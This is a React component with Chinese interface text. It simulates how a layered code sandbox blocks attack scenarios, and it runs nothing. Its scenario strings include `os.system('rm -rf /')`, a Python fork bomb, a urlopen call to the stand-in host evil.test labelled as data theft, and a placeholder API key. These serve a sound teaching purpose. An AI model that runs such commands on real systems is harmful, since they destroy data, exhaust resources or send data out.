import { useState } from 'react'

type Layer = 'ast' | 'cgroup' | 'network' | 'fs' | 'output' | 'pass'

interface Scenario {
  id: string
  title: string
  code: string
  blockedBy: Layer
  explanation: string
  simulated: {
    exitCode: number
    stdout: string
    stderr: string
    defenses: string[]
  }
}

const SCENARIOS: Scenario[] = [
  {
    id: 'safe',
    title: '正常计算',
    code: 'print(sum(range(101)))',
    blockedBy: 'pass',
    explanation: '无危险调用、不碰网络/文件系统、输出无密钥——四层防线全部放行。',
    simulated: {
      exitCode: 0,
      stdout: '5050\n',
      stderr: '',
      defenses: ['AST ✓', '资源限制 ✓', '断网 ✓', '输出审查 ✓'],
    },
  },
  {
    id: 'os-system',
    title: '注入：os.system',
    code: "import os\nos.system('rm -rf /')",
    blockedBy: 'ast',
    explanation: 'AST 静态检查在执行前拦截 os.system，代码根本进不了容器。',
    simulated: {
      exitCode: -2,
      stdout: '',
      stderr: '代码被拦截: 禁止调用: os.system',
      defenses: ['AST ✗ 拦截', '沙箱未启动', '输出审查跳过'],
    },
  },
  {
    id: 'fork-bomb',
    title: 'Fork 炸弹',
    code: 'while True:\n    __import__("os").fork()',
    blockedBy: 'cgroup',
    explanation: 'AST 可能漏检动态 fork；pids_limit 会限制进程数，超时后容器被 kill（exit -1 或资源杀）。',
    simulated: {
      exitCode: -1,
      stdout: '',
      stderr: '执行超时或进程数达上限（pids_limit）',
      defenses: ['AST 可能漏检', 'pids_limit ✓', 'timeout ✓'],
    },
  },
  {
    id: 'exfil',
    title: '外连窃取',
    code: "import urllib.request\nurllib.request.urlopen('http://evil.test')",
    blockedBy: 'network',
    explanation: 'network_mode=none 断网：即使代码进了容器，也无法建立 TCP 连接。',
    simulated: {
      exitCode: 1,
      stdout: '',
      stderr: 'URLError: Network is unreachable',
      defenses: ['AST 可能漏检', 'network_mode=none ✓'],
    },
  },
  {
    id: 'secret',
    title: '打印密钥',
    code: "print('sk-abcdefghijklmnopqrstuvwxyz0123456789ABCDEF')",
    blockedBy: 'output',
    explanation: '代码本身可执行，但输出审查在返回前把疑似密钥替换为 [REDACTED]。',
    simulated: {
      exitCode: 0,
      stdout: '[REDACTED-OpenAI密钥]\n',
      stderr: '',
      defenses: ['AST ✓', '沙箱执行 ✓', '输出审查 ✓ 脱敏'],
    },
  },
]

const layerLabel: Record<Layer, string> = {
  ast: 'AST 注入防护',
  cgroup: 'cgroup 资源限制',
  network: '网络隔离',
  fs: '只读文件系统',
  output: '输出审查',
  pass: '全部通过',
}

const layerStyle: Record<Layer, string> = {
  ast: 'border-danger-500/40 bg-danger-500/10 text-danger-300',
  cgroup: 'border-amber-500/40 bg-amber-500/10 text-amber-300',
  network: 'border-amber-500/40 bg-amber-500/10 text-amber-300',
  fs: 'border-amber-500/40 bg-amber-500/10 text-amber-300',
  output: 'border-brand-500/40 bg-brand-500/10 text-ink-100',
  pass: 'border-emerald-500/40 bg-emerald-500/10 text-emerald-300',
}

export function SandboxDemo() {
  const [activeId, setActiveId] = useState(SCENARIOS[0].id)
  const [ran, setRan] = useState(false)
  const scenario = SCENARIOS.find((s) => s.id === activeId) ?? SCENARIOS[0]

  const run = () => setRan(true)

  return (
    <div className="card p-5">
      <div className="mb-3 flex flex-wrap items-start justify-between gap-3">
        <div>
          <h4 className="text-sm font-semibold text-ink-100">代码沙箱安全演示</h4>
          <p className="mt-1 text-xs text-ink-500">
            选择攻击/正常场景，观察纵深防御哪一层拦住它（模拟，非真实 Docker）。
          </p>
        </div>
        {ran && (
          <div className={`rounded-lg border px-3 py-1.5 text-xs font-semibold ${layerStyle[scenario.blockedBy]}`}>
            {layerLabel[scenario.blockedBy]}
          </div>
        )}
      </div>

      <div className="mb-3 flex flex-wrap gap-2">
        {SCENARIOS.map((s) => (
          <button
            key={s.id}
            type="button"
            onClick={() => {
              setActiveId(s.id)
              setRan(false)
            }}
            className={`rounded-lg px-2.5 py-1 text-xs transition-colors ${
              activeId === s.id
                ? 'interactive-selected interactive-focus'
                : 'interactive-chip interactive-focus'
            }`}
          >
            {s.title}
          </button>
        ))}
      </div>

      <pre className="mb-3 overflow-x-auto rounded-lg border border-ink-700/80 bg-ink-900/60 p-3 font-mono text-[11px] text-ink-200">
        {scenario.code}
      </pre>

      <div className="mb-3 flex gap-2">
        <button
          type="button"
          onClick={run}
          className="interactive-selected interactive-focus rounded-lg px-3 py-1.5 text-xs"
        >
          模拟执行
        </button>
        <button
          type="button"
          onClick={() => setRan(false)}
          className="interactive-chip interactive-focus rounded-lg px-3 py-1.5 text-xs"
        >
          清空结果
        </button>
      </div>

      {ran && (
        <div className="space-y-3">
          <p className="text-xs leading-relaxed text-ink-300">{scenario.explanation}</p>
          <div className="flex flex-wrap gap-1.5">
            {scenario.simulated.defenses.map((d) => (
              <span
                key={d}
                className="rounded border border-ink-700 bg-ink-900/50 px-2 py-0.5 text-[10px] text-ink-400"
              >
                {d}
              </span>
            ))}
          </div>
          <div className="rounded-lg border border-ink-700/80 bg-ink-900/50 p-3 font-mono text-[11px]">
            <div className="mb-1 text-ink-500">exit_code: {scenario.simulated.exitCode}</div>
            {scenario.simulated.stdout && (
              <div className="text-emerald-400">
                <span className="text-ink-500">stdout: </span>
                {scenario.simulated.stdout}
              </div>
            )}
            {scenario.simulated.stderr && (
              <div className="text-danger-400">
                <span className="text-ink-500">stderr: </span>
                {scenario.simulated.stderr}
              </div>
            )}
          </div>
        </div>
      )}

      <p className="mt-3 text-[11px] leading-relaxed text-ink-500">
        纵深防御：AST/LLM 审查（执行前）→ Docker 隔离与 cgroup（运行时）→ 输出脱敏（返回前）。详见 L09-02 / L09-04 / P9。
      </p>
    </div>
  )
}
